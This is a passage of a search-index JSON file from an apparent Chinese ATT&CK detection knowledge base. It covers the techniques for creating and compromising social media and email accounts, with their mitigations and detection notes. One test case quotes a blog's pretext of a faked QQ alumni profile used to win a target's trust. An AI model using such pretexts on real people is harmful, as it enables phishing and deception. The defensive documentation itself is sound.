%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_6","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_8","title":"\u68c0\u6d4b","text":"<p>\u8003\u8651\u76d1\u6d4b\u4e0e\u4f60\u7684\u7ec4\u7ec7\u6709\u5173\u7684\u793e\u4ea4\u5a92\u4f53\u6d3b\u52a8\u3002\u53ef\u7591\u7684\u6d3b\u52a8\u53ef\u80fd\u5305\u62ec\u58f0\u79f0\u4e3a\u60a8\u7684\u7ec4\u7ec7\u5de5\u4f5c\u7684\u89d2\u8272\uff0c\u6216\u6700\u8fd1\u4fee\u6539\u8fc7\u7684\u8d26\u6237\u5411\u4e0e\u60a8\u7684\u7ec4\u7ec7\u76f8\u5173\u7684\u8d26\u6237\u63d0\u51fa\u5927\u91cf\u8fde\u63a5\u8bf7\u6c42\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u4ee5\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u8fdb\u884c\u9c7c\u53c9\u5f0f\u9493\u9c7c\uff09\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1585-001</p> <p>https://attack.mitre.org/techniques/T1585/001/</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/","title":"T1583-002-\u76d7\u53d6\u8d26\u6237-\u7535\u5b50\u90ae\u7bb1\u8d26\u6237","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u521b\u5efa\u53ef\u5728\u653b\u51fb\u76ee\u6807\u4e2d\u4f7f\u7528\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5728\u7535\u5b50\u90ae\u4ef6\u4f9b\u5e94\u5546\u5904\u521b\u5efa\u7684\u8d26\u6237\u6765\u63a8\u8fdb\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4f8b\u5982\u5229\u7528\u5b83\u4eec\u6765\u8fdb\u884c \"\u4fe1\u606f\u9493\u9c7c \"\u6216 \"\u7f51\u7edc\u9493\u9c7c\"\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u91c7\u53d6\u63aa\u65bd\uff0c\u56f4\u7ed5\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u57f9\u517b\u4e00\u4e2a\u89d2\u8272\uff0c\u4f8b\u5982\u901a\u8fc7\u4f7f\u7528\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u4ee5\u589e\u52a0\u540e\u7eed\u884c\u4e3a\u7684\u6210\u529f\u673a\u4f1a\u3002\u521b\u5efa\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u4e5f\u53ef\u7528\u4e8e\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\uff08\u4f8b\u5982\uff1a\u57df\u540d\uff09\u3002</p> <p>\u4e3a\u4e86\u51cf\u5c11\u5c06\u884c\u52a8\u4e0e\u81ea\u5df1\u8054\u7cfb\u8d77\u6765\u7684\u673a\u4f1a\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e00\u6b21\u6027\u7684\u7535\u5b50\u90ae\u4ef6\u670d\u52a1\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_6","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_8","title":"\u68c0\u6d4b","text":"<p>\u5927\u90e8\u5206\u6b64\u7c7b\u6d3b\u52a8\u5c06\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\u8fdb\u884c\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\uff09\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-002-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1585-002</p> <p>https://attack.mitre.org/techniques/T1585/002/</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/","title":"T1586-001-\u76d7\u53d6\u8d26\u6237-\u793e\u4ea4\u5a92\u4f53\u8d26\u6237","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u53d6\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u8fd9\u4e9b\u8d26\u6237\u53ef\u4ee5\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u3002\u5bf9\u4e8e\u5305\u542b\u793e\u4f1a\u5de5\u7a0b\u7684\u884c\u52a8\uff0c\u5229\u7528\u5728\u7ebf\u89d2\u8272\u53ef\u80fd\u5f88\u91cd\u8981\u3002\u4e0e\u5176\u521b\u5efa\u548c\u57f9\u517b\u793e\u4ea4\u5a92\u4f53\u6863\u6848\uff08\u5373\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff09\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u7528\u73b0\u6709\u7684\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\u3002\u5982\u679c\u6f5c\u5728\u7684\u53d7\u5bb3\u8005\u4e0e\u88ab\u653b\u51fb\u8005\u6709\u5173\u7cfb\uff0c\u6216\u8005\u77e5\u9053\u88ab\u653b\u51fb\u8005\u7684\u60c5\u51b5\uff0c\u90a3\u4e48\u5229\u7528\u73b0\u6709\u7684\u89d2\u8272\u53ef\u4ee5\u4f7f\u4ed6\u4eec\u4ea7\u751f\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4fe1\u4efb\u3002</p> <p>\u7834\u574f\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u6bd4\u5982\u901a\u8fc7\u9493\u9c7c\u7f51\u7ad9\u6536\u96c6\u4fe1\u606f\uff0c\u4ece\u7b2c\u4e09\u65b9\u7f51\u7ad9\u8d2d\u4e70\u4fe1\u606f\uff0c\u6216\u8005\u901a\u8fc7\u66b4\u529b\u7834\u89e3\u4fe1\u606f\uff08\u4f8b\u5982\uff1a\u4ece\u6cc4\u9732\u7684\u4fe1\u606f\u8f6c\u50a8\u4e2d\u91cd\u590d\u4f7f\u7528\u5bc6\u7801\uff0c\u7b80\u5355\u7406\u89e3\uff1a\u5c31\u662f\u649e\u5e93\uff09\u5728\u76d7\u7528\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8fdb\u884c\u4fa6\u5bdf\uff0c\u4ee5\u51b3\u5b9a\u7834\u574f\u54ea\u4e9b\u8d26\u6237\u6765\u63a8\u8fdb\u5176\u884c\u52a8\u3002</p> <p>\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff08\u89d2\u8272\uff09\u53ef\u80fd\u5b58\u5728\u4e8e\u4e00\u4e2a\u7f51\u7ad9\u6216\u591a\u4e2a\u7f51\u7ad9\u4e0a\uff08\u4f8b\u5982\uff1aFacebook\u3001LinkedIn\u3001Twitter\u7b49\uff09\u3002\u88ab\u5165\u4fb5\u7684\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\u53ef\u80fd\u9700\u8981\u989d\u5916\u7684\u5f00\u53d1\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u586b\u5199\u6216\u4fee\u6539\u4e2a\u4eba\u8d44\u6599\u4fe1\u606f\uff0c\u8fdb\u4e00\u6b65\u5f00\u53d1\u793e\u4ea4\u7f51\u7edc\uff0c\u6216\u52a0\u5165\u7167\u7247\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u88ab\u76d7\u7528\u7684\u793e\u4ea4\u5a92\u4f53\u8d44\u6599\u521b\u5efa\u65b0\u7684\uff0c\u6216\u52ab\u6301\u73b0\u6709\u7684\uff0c\u4e0e\u611f\u5174\u8da3\u7684\u76ee\u6807\u7684\u8054\u7cfb\u3002\u8fd9\u4e9b\u8fde\u63a5\u53ef\u80fd\u662f\u76f4\u63a5\u7684\uff0c\u4e5f\u53ef\u80fd\u5305\u62ec\u8bd5\u56fe\u901a\u8fc7\u4ed6\u4eba\u8fdb\u884c\u8fde\u63a5\u3002\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5176\u4ed6\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u8fdb\u884c\u7f51\u7edc\u9493\u9c7c\uff09\uff0c\u53ef\u4ee5\u5229\u7528\u88ab\u76d7\u7528\u7684\u8d26\u6237\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u7b80\u5355\u7406\u89e3\uff1a\u76d7\u7528\u4e00\u4e9b\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u6bd4\u5982xxx\u516c\u53f8\u7684\u8d22\u52a1\u4eba\u5458\uff0c\u7136\u540e\u901a\u8fc7\u8be5\u8d26\u6237\u548c\u5176\u4ed6\u5458\u5de5\u6c9f\u901a\u4ea4\u6d41\uff0c\u6216\u8005\u76f4\u63a5\u5229\u7528\u8be5\u8d26\u6237\u548c\u76ee\u6807\u8fdb\u884c\u6c9f\u901a\u3002\u6bd4\u5982\u6700\u5e38\u89c1\u7684\u5b9a\u4f4d\u653b\u51fb\u4eba\u5458\u8eab\u4efd\u4fe1\u606f\uff0c\u901a\u8fc7QQ\u8054\u7cfb\uff0c\u5c06\u81ea\u5df1\u7684QQ\u4fe1\u606f\u66f4\u6539\u4e3a\u548c\u653b\u51fb\u4eba\u5458\u5177\u6709\u4e00\u5b9a\u7684\u76f8\u4f3c\u4e4b\u5904\uff08\u540c\u4e00\u6240\u5b66\u6821\u3001\u540c\u4e00\u4e2a\u4e13\u4e1a\u7b49\uff09\uff0c\u53ef\u4ee5\u5e2e\u52a9\u4f60\u83b7\u53d6\u5230\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4fe1\u4efb\u3002\u8fd9\u662f\u6eaf\u6e90\u653b\u51fb\u4eba\u5458\u8eab\u4efd\u7684\u65b9\u5f0f\u4e4b\u4e00\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u662f\u653b\u51fb\u8005\u5bf9\u653b\u51fb\u76ee\u6807\u8fdb\u884c\u793e\u4f1a\u5de5\u7a0b\u884c\u52a8\u7684\u4e00\u90e8\u5206\u3002</p> <p>\u5177\u4f53\u6848\u4f8b\u53ef\u53c2\u8003\uff1a</p> <p>\u8bb0\u4e00\u6b21\u8270\u96be\u7684\u6eaf\u6e90\u6545\u4e8b\uff08\u5bf9\u4e0d\u8d77\u5b66\u957f\uff09\uff1ahttps://xz.aliyun.com/t/9582</p> <p>\u6709\u8fd9\u4e48\u4e00\u6bb5\u63cf\u8ff0\uff1a\u201d\u7528\u4e00\u4e2aqq\u7b49\u7ea7\u9ad8\u70b9\u7684\u5c0f\u53f7\uff0c\u4fee\u6539\u597d\u8d44\u6599\uff0c99\u5e74\uff0c18\u5c4a\uff0c\u67d0\u67d0\u9662\u6821\uff0c\u8ba1\u7b97\u673a\u4e13\u4e1a\uff0c\u7a7a\u95f4\u641e\u4e86\u4e9b\u5728\u8d34\u5427\u627e\u7684\u5b66\u6821\u7167\u7247\u3002\u5199\u4e0a18\u5c4a\u7684\u5b66\u5f1f\u60f3\u54a8\u8be2\u5c31\u4e1a\u4fe1\u606f\uff0c\u8ba2~\u597d\u53cb\u7533\u8bf7\u5df2\u53d1\u9001\u3002\u65e2\u7136\u662f\u505a\u68a6\uff0c\u80af\u5b9a\u662f\u534a\u591c\uff0c\u5e94\u8be5\u662f12\u70b9\u5de6\u53f3\u770b\u5230\u901a\u8fc7\u4e86\u8bf7\u6c42\uff0c\u4e5f\u5c31\u8fc7\u4e86\u5341\u6765\u5206\u949f\u5427\u3002\u6b63\u51c6\u5907\u53d1\u6784\u601d\u597d\u7684\u95ee\u5019\u5b66\u957f\u7684\u8bdd\u3002\u597d\u5bb6\u4f19\uff0c\u76f4\u63a5\u7ed9\u6211\u6765\u4e86\u4e00\u5927\u6ce2\u5185\u63a8\u3002\u8fd9\u91cc\u6697\u793a\u7684\u63d0\u4e86\u4e00\u4e0b\u81ea\u5df1\u662f\u505a\u5f00\u53d1\u7684\u4e0d\u662f\u7f51\u7edc\u5b89\u5168\u964d\u4f4e\u8b66\u60d5\u5fc3\u3002\u201c</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_6","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_8","title":"\u68c0\u6d4b","text":"<p>\u8003\u8651\u76d1\u6d4b\u4e0e\u4f60\u7684\u7ec4\u7ec7\u6709\u5173\u7684\u793e\u4ea4\u5a92\u4f53\u6d3b\u52a8\u3002\u53ef\u7591\u7684\u6d3b\u52a8\u53ef\u80fd\u5305\u62ec\u58f0\u79f0\u4e3a\u60a8\u7684\u7ec4\u7ec7\u5de5\u4f5c\u7684\u89d2\u8272\uff0c\u6216\u6700\u8fd1\u4fee\u6539\u8fc7\u7684\u8d26\u6237\u5411\u4e0e\u60a8\u7684\u7ec4\u7ec7\u76f8\u5173\u7684\u8d26\u6237\u63d0\u51fa\u5927\u91cf\u8fde\u63a5\u8bf7\u6c42\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u4ee5\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u8fdb\u884c\u9c7c\u53c9\u5f0f\u9493\u9c7c\uff09\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-001-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1586-001</p> <p>https://attack.mitre.org/techniques/T1586/001/</p> <p>\u8bb0\u4e00\u6b21\u8270\u96be\u7684\u6eaf\u6e90\u6545\u4e8b\uff08\u5bf9\u4e0d\u8d77\u5b66\u957f\uff09</p> <p>https://xz.aliyun.com/t/9582</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/","title":"T1586-002-\u76d7\u53d6\u8d26\u6237-\u7535\u5b50\u90ae\u7bb1\u8d26\u6237","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u7528\u53ef\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u88ab\u76d7\u7528\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u6765\u63a8\u8fdb\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4f8b\u5982\u5229\u7528\u5b83\u4eec\u6765\u8fdb\u884c\u4fe1\u606f\u9493\u9c7c\u6216\u7f51\u7edc\u9493\u9c7c\u3002\u5982\u679c\u6f5c\u5728\u7684\u53d7\u5bb3\u8005\u4e0e\u88ab\u653b\u51fb\u7684\u89d2\u8272\u6709\u5173\u7cfb\uff0c\u6216\u8005\u77e5\u9053\u88ab\u653b\u51fb\u7684\u89d2\u8272\uff0c\u90a3\u4e48\u5229\u7528\u73b0\u6709\u7684\u89d2\u8272\u4e0e\u88ab\u653b\u51fb\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u53ef\u80fd\u4f1a\u4f7f\u4ed6\u4eec\u4ea7\u751f\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4fe1\u4efb\u3002\u88ab\u5165\u4fb5\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u4e5f\u53ef\u7528\u4e8e\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\uff08\u4f8b\u5982\uff1a\u57df\u540d\uff09\u3002</p> <p>\u76d7\u53d6\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4f8b\u5982\u901a\u8fc7\u9493\u9c7c\u7f51\u7ad9\u6536\u96c6\u4fe1\u606f\uff0c\u4ece\u7b2c\u4e09\u65b9\u7f51\u7ad9\u8d2d\u4e70\u8bc1\u4e66\uff0c\u6216\u901a\u8fc7\u66b4\u529b\u7834\u89e3\uff08\u4f8b\u5982\uff1a\u4ece\u8fdd\u89c4\u51ed\u636e\u8f6c\u50a8\u4e2d\u91cd\u7528\u5bc6\u7801\uff0c\u7b80\u5355\u7406\u89e3\uff1a\u649e\u5e93\uff09\u3002\u5728\u76d7\u53d6\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8fdb\u884c\u4fa6\u5bdf\uff0c\u4ee5\u51b3\u5b9a\u7834\u574f\u54ea\u4e9b\u8d26\u6237\u6765\u63a8\u8fdb\u5176\u884c\u52a8\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u88ab\u5165\u4fb5\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\uff0c\u6765\u52ab\u6301\u4e0e\u611f\u5174\u8da3\u7684\u76ee\u6807\u7684\u73b0\u6709\u7535\u5b50\u90ae\u4ef6\u7ebf\u7a0b\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5f88\u597d\u7406\u89e3\uff0c\u8fd9\u91cc\u4e0d\u505a\u4efb\u4f55\u6848\u4f8b\u8bf4\u660e\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1586-002-%E7%9B%97%E5%8F%96%E8%B4%A6%E6%88%B7-%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e